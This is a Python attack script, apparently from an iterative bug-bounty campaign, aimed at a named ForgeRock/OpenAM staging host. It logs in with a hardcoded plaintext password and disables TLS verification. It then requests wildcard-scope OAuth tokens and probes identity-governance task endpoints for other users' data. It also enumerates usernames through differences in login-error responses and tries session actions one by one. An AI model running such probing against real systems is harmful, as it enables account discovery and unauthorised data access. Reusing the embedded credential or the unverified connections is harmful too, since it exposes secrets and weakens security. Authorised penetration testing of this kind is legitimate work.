# -*- coding: utf-8 -*-
"""AIC 第四十九轮:IGA tasks 重跑 + 根 realm authenticate + 用户名枚举 + sessions action
上轮:C 段代码 bug 请求结果丢失;roles/device/refresh 均封闭。
本轮:
A. IGA user/{id}/tasks 及 /iga/governance/tasks(200 面深挖)
B. 根 realm /am/json/authenticate(不同配置?树名枚举)
C. 认证树用户名枚举:Login 树对不存在用户名的响应差异
D. sessions ?_action 枚举(refresh/validate/logout/advanceSession)
预期结果表:
  成立 -> tasks 含他人数据/可操作;根 realm 有未加固树;用户名枚举可区分;session action 可执行
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

def authz(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    if 'code=' in loc:
        code = loc.split('code=')[1].split('&')[0]
        r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                                    'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
        return r2.json().get('access_token')
    return None

print('\n=== A. IGA tasks 深挖 ===')
at = authz('openid fr:iga:*')
if at:
    H = {'Authorization': 'Bearer ' + at, 'Accept-API-Version': 'resource=2.1, protocol=1.0'}
    paths = ['/iga/governance/user/%s/tasks' % MY_ID,
             '/iga/governance/user/%s/tasks?_action=search' % MY_ID,
             '/iga/governance/user/%s/tasks?_queryFilter=true' % MY_ID,
             '/iga/governance/tasks',
             '/iga/governance/tasks?_action=search',
             '/iga/governance/user/%s/tasks?status=pending' % MY_ID,
             '/iga/governance/user/%s/tasks?_fields=*' % MY_ID]
    for p in paths:
        try:
            r = S.get(BASE + p, headers=H, timeout=12, verify=False)
            print('%-78s -> %d %s' % (p[:78], r.status_code, r.text[:140].replace('\n', ' ')))
        except Exception as e:
            print('%s -> ERR %s' % (p[:60], str(e)[:60]))
        time.sleep(0.4)

print('\n=== B. 根 realm authenticate ===')
for path in ['/am/json/authenticate', '/am/json/realms/root/authenticate',
             '/am/json/realms/root/realms/alpha/authenticate']:
    try:
        r = S.post(BASE + path, json={}, timeout=12, verify=False)
        print('%-58s -> %d %s' % (path, r.status_code, r.text[:150].replace('\n', ' ')))
    except Exception as e:
        print('%-58s -> ERR %s' % (path, str(e)[:60]))
    time.sleep(0.4)

print('\n=== C. 认证树用户名枚举 ===')
def tree_login(username, password='WrongPass123!'):
    r = S.post(BASE + '/am/json/realms/alpha/authenticate?authIndexType=service&authIndexValue=Login',
               json={}, timeout=12, verify=False)
    d = r.json()
    authId = d.get('authId')
    if not authId:
        return 'no-authId:%s' % str(d)[:100]
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': username}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': password}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = S.post(BASE + '/am/json/realms/alpha/authenticate?authIndexType=service&authIndexValue=Login',
                json={'authId': authId, 'callbacks': cbs}, timeout=12, verify=False)
    j = r2.json()
    if j.get('tokenId'):
        return 'SUCCESS(不该出现,密码错)'
    err = j.get('errorMessage') or j.get('message') or str(j)[:120]
    return '%d %s' % (r2.status_code, err[:120])

names = [USER, 'pccp', 'nonexistent_user_xyz_987', 'admin', 'Administrator', 'regtest1644',
         'regdiag1648', 'sr1643a']
for n in names:
    try:
        print('Login树 user=%-22s -> %s' % (n, tree_login(n)))
    except Exception as e:
        print('Login树 user=%-22s -> ERR %s' % (n, str(e)[:60]))
    time.sleep(0.5)

print('\n=== D. sessions action 枚举 ===')
for act in ['refresh', 'validate', 'logout', 'advanceSession', 'getSessionInfo',
            'getIdleTimeout', 'getMaxTime', 'getProperty']:
    try:
        r = S.post(BASE + '/am/json/realms/alpha/sessions?_action=' + act, json={}, timeout=12, verify=False)
        print('sessions _action=%-16s -> %d %s' % (act, r.status_code, r.text[:130].replace('\n', ' ')))
    except Exception as e:
        print('sessions _action=%-16s -> ERR %s' % (act, str(e)[:60]))
    time.sleep(0.4)
